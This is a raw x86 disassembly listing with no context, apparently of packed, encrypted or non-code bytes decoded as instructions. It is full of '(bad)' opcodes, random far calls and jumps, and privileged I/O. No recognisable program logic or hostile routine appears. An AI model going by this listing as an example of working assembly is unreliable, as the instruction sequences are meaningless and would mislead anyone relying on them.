  41d5da:	shl    DWORD PTR [edi+0x7af6e84f],cl
  41d5e0:	sub    bh,cl
  41d5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5e3:	pop    edx
  41d5e4:	ror    DWORD PTR [esi],1
  41d5e6:	ror    ebx,1
  41d5e8:	xchg   edi,eax
  41d5e9:	cs mov dl,0xb7
  41d5ec:	jg     0x41d5ae
  41d5ee:	fnstsw WORD PTR [ebx-0x48444d11]
  41d5f4:	(bad)  
  41d5f5:	in     al,0xd4
  41d5f7:	and    al,0x37
  41d5f9:	outs   dx,BYTE PTR ds:[esi]
  41d5fa:	fsub   QWORD PTR [esp+eiz*2+0x3870d604]
  41d601:	pusha  
  41d602:	jecxz  0x41d5dd
  41d604:	jae    0x41d5d8
  41d606:	xor    al,0x61
  41d608:	inc    si
  41d60a:	test   DWORD PTR [ebp+0x5c],0xcbcc7b5b
  41d611:	xchg   edi,eax
  41d612:	das    
  41d613:	sub    BYTE PTR [edi+0x5d5e5cca],dl
  41d619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d61a:	pop    esp
  41d61b:	scas   al,BYTE PTR es:[edi]
  41d61c:	mov    al,0xb0
  41d61e:	mov    al,0x48
  41d620:	scas   eax,DWORD PTR es:[edi]
  41d621:	xlat   BYTE PTR ds:[ebx]
  41d622:	popa   
  41d623:	jnp    0x41d6a0
  41d625:	xchg   edx,edi
  41d627:	js     0x41d5c6
  41d629:	leave  
  41d62a:	leave  
  41d62b:	or     DWORD PTR [esi],esi
  41d62d:	ss (bad) 
  41d62f:	jns    0x41d5ea
  41d631:	mov    ch,0x45
  41d633:	xchg   esi,eax
  41d634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d635:	pop    esp
  41d636:	mov    ebp,0xe393957a
  41d63b:	adc    ecx,DWORD PTR [esi]
  41d63d:	push   cs
  41d63e:	jns    0xc5c75f06
  41d644:	inc    ebp
  41d645:	mov    ah,BYTE PTR [ebp-0x1e759bde]
  41d64b:	jo     0x41d68d
  41d64d:	test   eax,0xead2e152
  41d652:	gs enter 0x1a32,0x67
  41d657:	or     eax,0xc4ba5d2e
  41d65c:	fcom   st(4)
  41d65e:	or     al,0xfb
  41d660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d661:	addr16 pop esp
  41d663:	(bad)  
  41d665:	jnp    0x41d5f3
  41d667:	jge    0x41d664
  41d669:	push   edi
  41d66a:	mov    ebp,edi
  41d66c:	fsub   st(7),st
  41d66e:	xchg   ebx,eax
  41d66f:	bound  esp,QWORD PTR [edx-0x3]
  41d672:	out    0xff,al
  41d674:	push   edx
  41d675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d676:	jmp    0xffb2a44
  41d67b:	inc    eax
  41d67c:	or     bh,BYTE PTR [esi+0x2]
  41d67f:	aas    
  41d680:	call   FWORD PTR [esp+edx*1+0x4f]
  41d684:	loopne 0x41d61f
  41d686:	sbb    al,0x0
  41d688:	dec    esp
  41d689:	push   cs
  41d68a:	mov    dh,BYTE PTR [ecx]
  41d68c:	das    
  41d68d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d68e:	mov    es,eax
  41d690:	xchg   edi,eax
  41d691:	jnp    0x41d68b
  41d693:	mov    al,ds:0xf699c306
  41d698:	in     al,0x8d
  41d69a:	pop    edi
  41d69b:	cli    
  41d69c:	mov    ecx,0xbcee6eaf
  41d6a1:	outs   dx,DWORD PTR ds:[esi]
  41d6a2:	mov    edx,?
  41d6a4:	sti    
  41d6a5:	cmp    al,0x5e
  41d6a7:	pop    ebx
  41d6a8:	pop    ds
  41d6a9:	inc    eax
  41d6aa:	fcmovu st,st(4)
  41d6ac:	dec    DWORD PTR [ecx+ebx*2-0xb]
  41d6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6b1:	xor    eax,DWORD PTR [ebx]
  41d6b3:	lods   eax,DWORD PTR ds:[esi]
  41d6b4:	rol    ah,0xfc
  41d6b7:	sbb    eax,0xdd489f47
  41d6bc:	int3   
  41d6bd:	popa   
  41d6be:	ins    BYTE PTR es:[edi],dx
  41d6bf:	icebp  
  41d6c0:	in     al,0xda
  41d6c2:	les    ecx,FWORD PTR [esi-0x7725b0cc]
  41d6c8:	popf   
  41d6c9:	mov    al,0x61
  41d6cb:	xchg   edx,eax
  41d6cc:	inc    ecx
  41d6cd:	mov    ebx,0x3390510f
  41d6d2:	jle    0x41d73e
  41d6d4:	jb     0x41d698
  41d6d6:	add    DWORD PTR [eax],0xffffffe2
  41d6d9:	or     BYTE PTR [edx-0x59c21b1],cl
  41d6df:	in     al,0x4f
  41d6e1:	mov    cl,0xf7
  41d6e3:	jmp    0xc73e7d87
  41d6e8:	(bad)  
  41d6e9:	jo     0x41d75f
  41d6eb:	clc    
  41d6ec:	nop
  41d6ed:	jbe    0x41d6aa
  41d6ef:	inc    ebp
  41d6f0:	xor    DWORD PTR [edx-0x6378f3e8],ecx
  41d6f6:	xor    eax,0xfc7b58ce
  41d6fb:	mov    BYTE PTR [ebp-0x210a68b5],dl
  41d701:	add    ch,cl
  41d703:	jae    0x41d6d7
  41d705:	xor    al,0xe5
  41d707:	cli    
  41d708:	int    0x1b
  41d70a:	js     0x41d6aa
  41d70c:	inc    edi
  41d70d:	mov    eax,ds:0x6ed3a458
  41d712:	push   ecx
  41d713:	cs push edi
  41d715:	cwde   
  41d716:	cwde   
  41d717:	cwde   
  41d718:	(bad)  
  41d719:	idiv   DWORD PTR [ebp+0x5d]
  41d71c:	(bad)  
  41d71d:	fstp   TBYTE PTR [edx]
  41d71f:	daa    
  41d720:	mov    fs,WORD PTR [ebx+0x3c]
  41d723:	in     eax,0x51
  41d725:	xor    bh,BYTE PTR [ebx-0x38610524]
  41d72b:	ret    0x22c2
  41d72e:	in     eax,0x72
  41d730:	cdq    
  41d731:	enter  0xf014,0x3c
  41d735:	jns    0x41d729
  41d737:	cwde   
  41d738:	js     0x41d76a
  41d73a:	fs jmp 0x413ddd02
  41d740:	ja     0x41d728
  41d742:	sbb    eax,0x71c4060c
  41d747:	inc    edx
  41d748:	pusha  
  41d749:	adc    al,BYTE PTR [edi+0x18272726]
  41d74f:	or     al,0x6
  41d751:	mov    esp,0x8e039df7
  41d756:	mov    cs,WORD PTR [edi+0x7c6a54a9]
  41d75c:	out    0x33,al
  41d75e:	aas    
  41d75f:	dec    eax
  41d760:	mov    ch,0x56
  41d762:	and    eax,0x2626124d
  41d767:	es stc 
  41d769:	(bad)  
  41d76a:	aaa    
  41d76b:	mov    edi,0x2f97cbc1
  41d770:	(bad)  
  41d772:	fsubrp st(2),st
  41d774:	sti    
  41d775:	aas    
  41d776:	cmc    
  41d777:	sub    DWORD PTR [esi],edi
  41d779:	icebp  
  41d77a:	mov    DWORD PTR [edi+0x68],ecx
  41d77d:	addr16 fdivr st(2),st
  41d780:	and    al,BYTE PTR [edi+0x47]
  41d783:	daa    
  41d784:	fdiv   st(5),st
  41d786:	into   
  41d787:	mov    ebx,0x6e6d5ab4
  41d78c:	fistp  QWORD PTR [ecx-0x48a45233]
  41d792:	test   al,0xd5
  41d794:	push   0x54
  41d796:	retf   0x4a25
  41d799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d79a:	xor    bh,BYTE PTR [edi-0x32402403]
  41d7a0:	not    dh
  41d7a2:	ss int 0x46
  41d7a5:	sbb    DWORD PTR [edi],0xfffffffe
  41d7a8:	cld    
  41d7a9:	out    0x99,eax
  41d7ab:	popf   
  41d7ac:	sahf   
  41d7ad:	mov    eax,ds:0x7a633cd1
  41d7b2:	jp     0x41d73a
  41d7b4:	arpl   bx,dx
  41d7b6:	xchg   esp,eax
  41d7b7:	xor    al,0x8a
  41d7b9:	and    al,BYTE PTR [esi+0x27272183]
  41d7bf:	daa    
  41d7c0:	ins    BYTE PTR es:[edi],dx
  41d7c1:	ins    BYTE PTR es:[edi],dx
  41d7c2:	lods   al,BYTE PTR ds:[esi]
  41d7c3:	push   ebx
  41d7c4:	aas    
  41d7c5:	cmp    DWORD PTR [esi+0x6c],esp
  41d7c8:	ins    BYTE PTR es:[edi],dx
  41d7c9:	mov    WORD PTR [ebx+0x24926f37],ds
  41d7cf:	xor    edi,edx
  41d7d1:	scas   eax,DWORD PTR es:[edi]
  41d7d2:	fnstsw ax
  41d7d4:	fidivr WORD PTR [ebp+0x78bd6c7b]
  41d7da:	and    edi,0xbd5fae29
  41d7e0:	inc    esi
  41d7e1:	cmp    al,0x1c
  41d7e3:	jb     0x41d857
  41d7e5:	jl     0x41d833
  41d7e7:	sbb    al,0xf
  41d7e9:	or     DWORD PTR [edx+0x7cdf3780],eax
  41d7ef:	push   ebx
  41d7f0:	xlat   BYTE PTR ds:[ebx]
  41d7f1:	pop    ebx
  41d7f2:	int3   
  41d7f3:	dec    esp
  41d7f4:	mov    cl,0xbe
  41d7f6:	inc    BYTE PTR [eiz*4+0x71f5ea3c]
  41d7fd:	mov    bl,0x1
  41d7ff:	jmp    0xa735c51e
  41d804:	jmp    0xf1f36c87
  41d809:	je     0x41d7a8
  41d80b:	push   0xffffffad
  41d80d:	(bad)  
  41d80e:	in     eax,0xd5
  41d810:	retf   
  41d811:	adc    al,0x8e
  41d813:	(bad)  
  41d814:	cmp    DWORD PTR [ebx],edi
  41d816:	cmp    DWORD PTR ds:0x771bcee0,eax
  41d81c:	sbb    BYTE PTR [eax+0x23cde722],ch
  41d822:	fidivr WORD PTR [edx-0xf]
  41d825:	or     edx,DWORD PTR [edi+ebx*1]
  41d828:	cld    
  41d829:	push   cs
  41d82a:	fst    QWORD PTR [eax]
  41d82c:	and    cl,BYTE PTR [edi]
  41d82e:	xchg   BYTE PTR [ebx],al
  41d830:	ret    
  41d831:	clc    
  41d832:	pop    ecx
  41d833:	outs   dx,BYTE PTR ds:[esi]
  41d834:	ffreep st(7)
  41d836:	mov    cl,0xa6
  41d838:	pop    DWORD PTR [eax+0x41]
  41d83b:	pushf  
  41d83c:	in     eax,0x5e
  41d83e:	jl     0x41d8b0
  41d840:	call   0x889ba90f
  41d845:	inc    ecx
  41d846:	xchg   edx,eax
  41d847:	(bad)  
  41d848:	sbb    ebx,DWORD PTR [eax-0x6e7d3c5f]
  41d84e:	lahf   
  41d84f:	sub    ebx,DWORD PTR [edx]
  41d851:	or     DWORD PTR [ebx],ecx
  41d853:	xchg   dh,dl
  41d855:	pop    edi
  41d856:	nop
  41d857:	test   eax,0xe3fc7ba8
  41d85c:	shl    BYTE PTR [edi],0xde
  41d85f:	pop    edi
  41d860:	outs   dx,BYTE PTR ds:[esi]
  41d861:	stc    
  41d862:	mov    ebp,0x22daf1f
  41d867:	clc    
  41d868:	(bad)  
  41d86a:	in     eax,0xfd
  41d86c:	test   eax,0x6dfb6f72
  41d871:	aas    
  41d872:	xor    al,0x1f
  41d874:	cmp    BYTE PTR [ecx],bh
  41d876:	(bad)  
  41d877:	test   eax,0x59b151ce
  41d87c:	or     al,0xe2
  41d87f:	cdq    
  41d880:	test   BYTE PTR [ebp+0xfdc934],cl
  41d886:	(bad)  
  41d887:	loope  0x41d8f0
  41d889:	adc    al,BYTE PTR [edi-0x258fc5dc]
  41d88f:	and    ebx,0xffffffb6
  41d892:	jno    0x41d894
  41d894:	sbb    al,BYTE PTR [edi-0x71]
  41d897:	adc    al,0x84
  41d899:	inc    esp
  41d89a:	mov    eax,ds:0x50070389
  41d89f:	jmp    0x41d916
  41d8a1:	test   al,0x6f
  41d8a3:	jg     0x41d832
  41d8a5:	dec    esi
  41d8a6:	xor    DWORD PTR [eax-0x32d902c1],esp
  41d8ac:	inc    esi
  41d8ad:	adc    esi,DWORD PTR [edx-0x4ccc4cdf]
  41d8b3:	je     0x41d8ef
  41d8b5:	ins    DWORD PTR es:[edi],dx
  41d8b6:	jp     0x41d8b5
  41d8b8:	push   ds
  41d8b9:	aaa    
  41d8ba:	outs   dx,DWORD PTR ds:[esi]
  41d8bb:	fsub   QWORD PTR [eax+0x6ad5d75e]
  41d8c1:	jp     0x41d8e6
  41d8c3:	ror    BYTE PTR [edx],1
  41d8c5:	lds    esp,FWORD PTR [edx-0x7f]
  41d8c8:	stc    
  41d8c9:	test   DWORD PTR ds:0x4f36adda,eax
  41d8cf:	lahf   
  41d8d0:	cmp    al,0x26
  41d8d2:	dec    esi
  41d8d3:	push   ebx
  41d8d4:	push   0xffffffd5
  41d8d6:	sbb    bl,bl
  41d8d8:	cmp    edi,DWORD PTR [edx-0x39]
  41d8db:	call   0x6e3:0x7eb84934
  41d8e2:	xchg   ebp,eax
  41d8e3:	jb     0x41d86a
  41d8e5:	push   edx
  41d8e6:	test   eax,0xa55ab548
  41d8eb:	shr    DWORD PTR [ecx-0x2f],cl
  41d8ee:	push   0xab55a834
  41d8f3:	ror    BYTE PTR fs:[ebx+0x359c9be7],0xce
  41d8fb:	push   eax
  41d8fc:	sahf   
  41d8fd:	loop   0x41d88c
  41d8ff:	aaa    
  41d900:	ds inc edx
  41d902:	mov    ch,0x52
  41d904:	arpl   WORD PTR [ecx+0x71],si
  41d907:	xchg   ecx,eax
  41d908:	mov    DWORD PTR [ecx+0x7c3d1e71],ecx
  41d90e:	(bad)  
  41d90f:	shl    DWORD PTR [edi+0x60c194f],cl
  41d915:	add    al,0x7e
  41d917:	inc    eax
  41d918:	sbb    al,0xc7
  41d91a:	hlt    
  41d91b:	pop    es
  41d91c:	add    esp,DWORD PTR [esi+0x67]
  41d91f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d920:	sub    DWORD PTR [ebp-0x61626375],edx
  41d926:	mov    ds:0x45144794,al
  41d92b:	pushf  
  41d92c:	sahf   
  41d92d:	sahf   
  41d92e:	jno    0x41d9a6
  41d930:	jp     0x41d934
  41d932:	dec    edx
  41d933:	test   DWORD PTR [edi],0xf44b94a8
  41d939:	jp     0x41d978
  41d93b:	stos   BYTE PTR es:[edi],al
  41d93c:	aad    0x9a
  41d93e:	out    dx,al
  41d93f:	dec    ebx
  41d940:	mov    eax,0x8e30c5b5
  41d945:	cdq    
  41d946:	call   0x9d9e:0x8d9bd29c
  41d94d:	loope  0x41d9c8
  41d94f:	mov    edx,0xc1c1f83d
  41d954:	or     DWORD PTR [esi+0xd],0x9bb1999e
  41d95b:	jb     0x41d999
  41d95d:	jg     0x41d955
  41d95f:	mov    WORD PTR [ebx+ecx*2],?
  41d962:	sbb    DWORD PTR [ebx],ebx
  41d964:	sbb    esp,DWORD PTR [ebx-0x68cd1a4]
  41d96a:	loop   0x41d991
  41d96c:	out    0xe6,al
  41d96e:	pop    ss
  41d96f:	mov    eax,0xbc3bf77b
  41d974:	js     0x41d96f
  41d976:	adc    BYTE PTR [esi-0x55],0xc5
  41d97a:	int    0x1b
  41d97c:	aaa    
  41d97d:	test   al,0xd5
  41d97f:	jmp    0x41d99b
  41d981:	dec    esi
  41d982:	inc    edi
  41d983:	add    eax,0xd06cd1a
  41d988:	arpl   bx,cx
  41d98a:	(bad)  
  41d98b:	lea    ecx,[edi+0x31f8f6b3]
  41d991:	fwait
  41d992:	fwait
  41d993:	iret   
  41d994:	call   0xb91e548e
  41d999:	jno    0x41d91e
  41d99b:	and    al,0x8d
  41d99d:	jmp    0x69e69517
  41d9a2:	inc    esi
  41d9a3:	push   esp
  41d9a4:	sub    al,0x50
  41d9a6:	stos   DWORD PTR es:[edi],eax
  41d9a7:	push   esp
  41d9a8:	mov    ecx,0x9d26f371
  41d9ad:	dec    esi
  41d9ae:	fwait
  41d9af:	int    0xe7
  41d9b1:	fwait
  41d9b2:	push   esp
  41d9b3:	sub    edx,DWORD PTR ds:0x6ce3ebc6
  41d9b9:	ds jg  0x41d98a
  41d9bc:	into   
  41d9bd:	out    dx,al
  41d9be:	ss mov ch,0x5a
  41d9c1:	(bad)  
  41d9c2:	cli    
  41d9c3:	clc    
  41d9c4:	cmp    BYTE PTR [edi],cl
  41d9c6:	out    dx,eax
  41d9c7:	(bad)  
  41d9c9:	hlt    
  41d9ca:	in     al,0x84
  41d9cc:	retf   
  41d9cd:	push   edi
  41d9ce:	scas   eax,DWORD PTR es:[edi]
  41d9cf:	jae    0x41d9a3
  41d9d1:	dec    ebx
  41d9d2:	cmp    DWORD PTR [eax-0x5a6f005],edi
  41d9d8:	jmp    0xfa63:0xf9f148ff
  41d9df:	inc    esi
  41d9e0:	mov    al,0x67
  41d9e2:	xchg   edx,eax
  41d9e3:	std    
  41d9e4:	cdq    
  41d9e5:	in     eax,0xb4
  41d9e7:	xchg   edx,eax
  41d9e8:	gs pop edx
  41d9ea:	add    BYTE PTR [eax-0xfcfed74],ah
  41d9f0:	ds hlt 
  41d9f2:	repnz cli 
  41d9f4:	add    BYTE PTR [ebp-0x2c7ef1ea],al
  41d9fa:	sub    al,0x24
  41d9fc:	and    eax,0x312a0a77
  41da01:	adc    DWORD PTR [esp+edi*1+0x72f3c08f],edi
  41da08:	test   DWORD PTR [ebx],edx
  41da0a:	clc    
  41da0b:	xor    al,cl
  41da0d:	ret    0x4fc2
  41da10:	(bad)  
  41da11:	aam    0x1f
  41da13:	stc    
  41da14:	fstp   DWORD PTR [edi+0x2e7bb5ff]
  41da1a:	outs   dx,BYTE PTR ds:[esi]
  41da1b:	jge    0x41da8a
  41da1d:	mov    ss,edi
  41da1f:	push   edx
  41da20:	add    BYTE PTR [esi+edi*8-0x1a],ch
  41da24:	iret   
  41da25:	push   ebp
  41da26:	ret    0x7fbb
  41da29:	sti    
  41da2a:	mov    edi,0x99df82b
  41da2f:	pushf  
  41da30:	pop    edx
  41da31:	ins    BYTE PTR es:[edi],dx
  41da32:	inc    ecx
  41da33:	add    BYTE PTR [edx],cl
  41da35:	daa    
  41da36:	inc    ecx
  41da37:	ret    
  41da38:	icebp  
  41da39:	repnz sti 
  41da3b:	xchg   edx,eax
  41da3c:	push   ss
  41da3d:	mov    WORD PTR [esi],?
  41da3f:	das    
  41da40:	jbe    0x41d9e4
  41da42:	add    dh,BYTE PTR [ecx-0x1d1cfaf8]
  41da48:	fnstsw WORD PTR [edx]
  41da4a:	cmp    DWORD PTR [esi+0x2],0x77275085
  41da51:	adc    BYTE PTR [ecx],0x4
  41da54:	mov    esi,0xdf02cfe
  41da59:	and    DWORD PTR [eax+eiz*4+0x2fe33106],eax
  41da60:	mov    edi,0x98f14cce
  41da65:	(bad)  
  41da66:	clc    
  41da67:	xor    eax,0x5c8b89a2
  41da6c:	pop    edx
  41da6d:	pop    esi
  41da6e:	and    BYTE PTR [edx-0x383839de],cl
  41da74:	add    DWORD PTR [ebp+0x18],eax
  41da77:	inc    ebp
  41da78:	dec    esp
  41da79:	dec    esi
  41da7a:	dec    esi
  41da7b:	push   eax
  41da7c:	stos   DWORD PTR es:[edi],eax
  41da7d:	lea    esi,[ecx-0x2e314142]
  41da83:	rcl    DWORD PTR [ecx],1
  41da85:	xchg   ebx,eax
  41da86:	xchg   ebx,eax
  41da87:	xchg   ebx,eax
  41da88:	hlt    
  41da89:	push   es
  41da8a:	cmp    eax,0x69b6b6b6
  41da8f:	xor    al,0x1b
  41da91:	aam    0x6a
  41da93:	xor    eax,0xe8e6e766
  41da98:	je     0x41dad4
  41da9a:	aam    0x6a
  41da9c:	arpl   WORD PTR [edi+ecx*4+0x408d9b8f],cx
  41daa3:	es cdq 
  41daa5:	cwde   
  41daa6:	cwde   
  41daa7:	in     al,0xd1
  41daa9:	ret    
  41daaa:	pop    es
  41daab:	mov    esp,0xbb49b17c
  41dab0:	shl    DWORD PTR [ecx+0x6c],cl
  41dab3:	lods   al,BYTE PTR ds:[esi]
  41dab4:	call   0xaf19:0xe77
  41daba:	(bad)  
  41dabb:	push   ebx
  41dabc:	sub    dl,BYTE PTR [ebp-0x18]
  41dabf:	cmc    
  41dac0:	mov    edx,0x26254a94
  41dac5:	es es pop eax
  41dac8:	pop    ebx
  41dac9:	jnp    0x41da97
  41dacb:	icebp  
  41dacc:	icebp  
  41dacd:	and    DWORD PTR [ebp-0x482470b2],edi
  41dad3:	outs   dx,DWORD PTR ds:[esi]
  41dad4:	xor    DWORD PTR [ebx+0x72],esp
  41dad7:	hlt    
  41dad8:	push   edi
  41dad9:	scas   eax,DWORD PTR es:[edi]
  41dada:	pop    esp
  41dadb:	loope  0x41dac2
  41dadd:	mov    edx,DWORD PTR [edi+0x7bdef7bc]
  41dae3:	in     al,dx
  41dae4:	out    dx,al
  41dae5:	out    dx,al
  41dae6:	push   eax
  41dae7:	sub    dl,BYTE PTR [ebp+0x11acb0b8]
  41daed:	les    edx,FWORD PTR [ebp+0x61842bd5]
  41daf3:	sar    BYTE PTR [ebx+0x77],0xdf
  41daf7:	arpl   WORD PTR [ebp+0x63],di
  41dafa:	cmp    DWORD PTR [esi+0x57],0x17
  41dafe:	retf   0x6ad4
  41db01:	xor    eax,0x5ce3ebc6
  41db06:	mov    edx,0xcf679174
  41db0b:	sahf   
  41db0c:	icebp  
  41db0d:	loopne 0x41daed
  41db0f:	cmp    eax,0x74777776
  41db14:	mov    ds:0x28974bd2,eax
  41db19:	push   edi
  41db1a:	stos   DWORD PTR es:[edi],eax
  41db1b:	pop    esp
  41db1c:	mov    edi,0xb75e9d71
  41db21:	(bad)  
  41db22:	mov    ebx,0xe39779df
  41db27:	jecxz  0x41db8c
  41db29:	mov    al,BYTE PTR [ebp-0x2391c8fe]
  41db2f:	and    al,0xa
  41db31:	add    ecx,DWORD PTR [edx+0x25]
  41db34:	mov    ebp,0xd6d6c969
  41db39:	dec    ebx
  41db3a:	(bad)  
  41db3c:	out    0x4c,eax
  41db3e:	dec    edi
  41db3f:	dec    ebp
  41db40:	push   ecx
  41db41:	scas   al,BYTE PTR es:[edi]
  41db42:	push   esp
  41db43:	fcomp  st(1)
  41db45:	fisub  WORD PTR [edx-0x13]
  41db48:	icebp  
  41db49:	sbb    ch,BYTE PTR [ecx+0x12]
  41db4c:	mov    bl,0xbc
  41db4e:	mov    esp,0x2ccceccc
  41db53:	jae    0x41db60
  41db55:	or     ecx,DWORD PTR [ebp+edx*8+0x64fa78c7]
  41db5c:	int    0x84
  41db5e:	repnz or DWORD PTR es:[ebx+0x4fa7f588],esp
  41db66:	jns    0x41db66
  41db68:	cld    
  41db69:	sbb    DWORD PTR [ebx],edx
  41db6b:	xchg   ebx,eax
  41db6c:	adc    ebx,DWORD PTR [esi+edi*4-0x44]
  41db70:	stos   BYTE PTR es:[edi],al
  41db71:	mov    bh,0x36
  41db73:	(bad)  
  41db75:	cli    
  41db76:	mov    ebp,0x7118611e
  41db7b:	gs jne 0x41db13
  41db7e:	cdq    
  41db7f:	mov    ecx,0x17f99d39
  41db84:	(bad)  
  41db85:	pop    esp
  41db86:	mov    eax,0xdddd8170
  41db8b:	sbb    eax,0x89b6b6b6
  41db90:	jmp    0x37ef:0x4a7e84b3
  41db97:	(bad)  
  41db98:	xor    dl,BYTE PTR [edi-0x3dc60222]
  41db9e:	mov    sp,WORD PTR [ecx-0x713b1377]
  41dba5:	iret   
  41dba6:	(bad)  
  41dba7:	push   ebx
  41dba8:	push   ss
  41dba9:	inc    eax
  41dbaa:	push   0x5f
  41dbac:	push   eax
  41dbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbae:	mov    edi,0x406899af
  41dbb3:	call   0xc110fba3
  41dbb8:	inc    eax
  41dbba:	sar    DWORD PTR [edi-0x59],cl
  41dbbd:	sub    ch,BYTE PTR [edi+0x8]
  41dbc0:	loop   0x41dbdb
  41dbc2:	and    eax,0x19033b63
  41dbc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbc8:	xchg   esp,eax
  41dbc9:	fs mov ecx,0x4d6049
  41dbcf:	psubsb mm6,QWORD PTR [ebp-0x460aa419]
  41dbd6:	mov    edi,0xb1bf73f9
  41dbdb:	jno    0x41dbd9
  41dbdd:	add    DWORD PTR [eax-0xe0cc032],esi
  41dbe3:	pop    edx
  41dbe4:	call   0xb27c:0xafb3c900
  41dbeb:	xchg   esp,eax
  41dbec:	sbb    al,0xaf
  41dbee:	stos   BYTE PTR es:[edi],al
  41dbef:	xor    bh,BYTE PTR [edx+ebx*2+0x406123e4]
  41dbf6:	dec    edi
  41dbf7:	in     al,dx
  41dbf8:	jge    0x41dc53
  41dbfa:	sbb    BYTE PTR [ebp+0x5a46006b],ah
  41dc00:	adc    BYTE PTR [ecx+0x4d260eff],0xd3
  41dc07:	sbb    DWORD PTR [esi+0xc],0xffffffcd
  41dc0b:	sahf   
  41dc0c:	mov    cl,0xf9
  41dc0e:	xor    BYTE PTR [ecx+0x1f],ah
  41dc11:	adc    edi,ebx
  41dc13:	adc    eax,0x85912024
  41dc18:	je     0x41dc22
  41dc1a:	inc    ecx
  41dc1b:	or     ch,bh
  41dc1d:	adc    al,0x8a
  41dc1f:	mov    edi,0x3dbcabf3
  41dc24:	rep ins DWORD PTR es:[edi],dx
  41dc26:	ficomp DWORD PTR [edi-0x65c62808]
  41dc2c:	cld    
  41dc2d:	dec    ecx
  41dc2e:	xchg   edx,eax
  41dc2f:	mov    al,0xc6
  41dc31:	test   ebp,esp
  41dc33:	cmp    ah,BYTE PTR [edi-0x39]
  41dc36:	daa    
  41dc37:	cmp    al,0x7a
  41dc39:	lock sbb cl,0xd9
  41dc3d:	pop    ecx
  41dc3e:	xchg   esi,eax
  41dc3f:	cs pop esp
  41dc41:	mov    al,ds:0xece4de75
  41dc46:	in     al,dx
  41dc47:	or     al,0xf5
  41dc49:	fsub   DWORD PTR [ebx-0xb]
  41dc4c:	shr    BYTE PTR [edx],cl
  41dc4e:	adc    edx,DWORD PTR [ebx+0x4d9ab493]
  41dc54:	fld    TBYTE PTR [ecx-0x7675ac29]
  41dc5a:	icebp  
  41dc5b:	jno    0x41dc6b
  41dc5d:	(bad)  
  41dc5e:	vmwrite esi,ecx
  41dc61:	bound  edx,QWORD PTR [ebx-0x68c54e4f]
  41dc67:	scas   eax,DWORD PTR es:[edi]
  41dc68:	lods   al,BYTE PTR ds:[esi]
  41dc69:	push   edx
  41dc6a:	mov    BYTE PTR [edx],cl
  41dc6c:	fs pop ecx
  41dc6e:	(bad)  
  41dc6f:	stc    
  41dc70:	jns    0x41dc05
  41dc72:	mov    cl,0xb1
  41dc74:	cmp    dl,BYTE PTR [ebx+0x33]
  41dc77:	mov    edx,0xac7d7e1f
  41dc7c:	into   
  41dc7d:	xchg   ebx,eax
  41dc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc7f:	dec    edi
  41dc80:	jns    0x41dc7e
  41dc82:	call   0x8dac9198
  41dc87:	stos   DWORD PTR es:[edi],eax
  41dc88:	xlat   BYTE PTR ds:[ebx]
  41dc89:	scas   eax,DWORD PTR es:[edi]
  41dc8a:	mov    cl,0xb4
  41dc8c:	mov    ah,0x44
  41dc8e:	mov    bh,0xd3
  41dc90:	gs push 0x6a
  41dc93:	pop    edx
  41dc94:	out    dx,eax
  41dc95:	fwait
  41dc96:	xchg   edi,eax
  41dc97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc98:	mov    ah,0x5b
  41dc9a:	out    0x24,eax
  41dc9c:	leave  
  41dc9d:	xor    al,0x41
  41dc9f:	loopne 0x41dc8c
  41dca1:	test   BYTE PTR [esi+0x79e51f7e],bl
  41dca7:	aam    0xc6
  41dca9:	(bad)  
  41dcaa:	cwde   
  41dcab:	fwait
  41dcac:	fwait
  41dcad:	addr16 push 0x6a
  41dcb0:	and    cl,0x30
  41dcb3:	out    0xf4,al
  41dcb5:	hlt    
  41dcb6:	test   BYTE PTR [esi-0x45],cl
  41dcb9:	dec    ebp
  41dcba:	mov    ds:0xe9ade4d9,eax
  41dcbf:	sub    DWORD PTR [edx],ebp
  41dcc1:	aad    0xa
  41dcc3:	fnsave [esi-0x79]
  41dcc6:	icebp  
  41dcc7:	mov    DWORD PTR [ecx],ecx
  41dcc9:	sahf   
  41dcca:	call   0xf3c7:0xd0debb8e
  41dcd1:	cmp    al,0x4a
  41dcd3:	in     eax,0x12
  41dcd5:	inc    ecx
  41dcd6:	loopne 0x41dc6b
  41dcd8:	or     DWORD PTR es:[ecx-0x56],ecx
  41dcdc:	jae    0x41dcfc
  41dcde:	mov    dl,0x54
  41dce0:	ja     0x41dce7
  41dce2:	fcmovu st,st(1)
  41dce4:	(bad)  
  41dce6:	stc    
  41dce7:	out    0x73,al
  41dce9:	jp     0x41dca8
  41dceb:	push   ds
  41dcec:	sub    edx,DWORD PTR [edi]
  41dcee:	das    
  41dcef:	jb     0x41dce4
  41dcf1:	out    0x2d,al
  41dcf3:	es mov bh,0xb9
  41dcf7:	mov    al,0x7c
  41dcf9:	sub    DWORD PTR [esi-0x41],0x8fc793cb
  41dd00:	jmp    0xcd0ed7fa
  41dd05:	dec    esp
  41dd06:	push   ebx
  41dd07:	sub    dl,BYTE PTR [ebp-0x5fc7c7c8]
  41dd0d:	aad    0x3a
  41dd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd10:	push   eax
  41dd11:	sub    al,0x72
  41dd13:	imul   esi,ebp,0x1313e332
  41dd19:	pop    esp
  41dd1a:	mov    edi,0x83c38371
  41dd1f:	add    ecx,DWORD PTR [esi]
  41dd21:	femms  
  41dd23:	mov    ebx,edx
  41dd25:	test   BYTE PTR [esi-0x59],ch
  41dd28:	retf   
  41dd29:	fmulp  st(6),st
  41dd2b:	push   cs
  41dd2c:	imul   ebp,DWORD PTR [ebx+0x6b],0xffffff94
  41dd30:	retf   
  41dd31:	fidivr WORD PTR gs:[ebx+eiz*8+0xd]
  41dd36:	sub    dl,BYTE PTR [ebp-0x7f1e3cd6]
  41dd3c:	inc    esi
